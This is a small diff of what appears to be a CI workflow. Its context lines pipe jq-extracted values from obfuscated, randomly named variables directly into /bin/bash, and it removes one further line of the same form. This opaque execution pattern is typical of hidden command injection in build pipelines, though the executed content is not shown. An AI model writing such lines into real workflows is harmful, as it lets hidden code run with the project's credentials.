@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$tu03027" | jq -r .copib37640 | /bin/bash
           echo $xssyf84 | jq -r .bpjr64 | /bin/bash
           printf '%s' "$e74" | jq -r .jonao22 | /bin/bash
-          echo $fh100 | jq -r .t810 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
